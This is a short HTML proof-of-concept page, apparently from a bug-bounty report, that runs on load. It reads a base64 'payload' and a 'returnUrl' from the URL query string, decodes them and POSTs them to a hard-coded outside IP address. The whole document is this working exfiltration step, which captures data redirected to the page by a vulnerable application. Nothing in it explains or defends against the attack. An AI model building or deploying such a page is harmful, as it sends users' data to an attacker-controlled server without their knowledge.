<!DOCTYPE html>
<html>
<head>
    <title>Commissioning POC</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Poc by @gopal_ethical</h1>
    <div id="status">Sending data...</div>

    <script>
        async function sendData() {
            const payload = new URLSearchParams(window.location.search).get("payload");
            const returnUrl = new URLSearchParams(window.location.search).get("returnUrl");

            const dataToSend = {
                payload: JSON.parse(atob(decodeURIComponent(payload))),
                returnUrl: returnUrl,
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch("https://167.172.255.123:8080/log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(dataToSend)
                });
                document.getElementById("status").textContent = 
                    `✅ Data sent! Status: ${response.status}`;
            } catch (err) {
                document.getElementById("status").textContent = 
                    `❌ Error: ${err.message}`;
            }
        }

        // Start sending when page loads
        window.onload = sendData;
    </script>
</body>
</html>
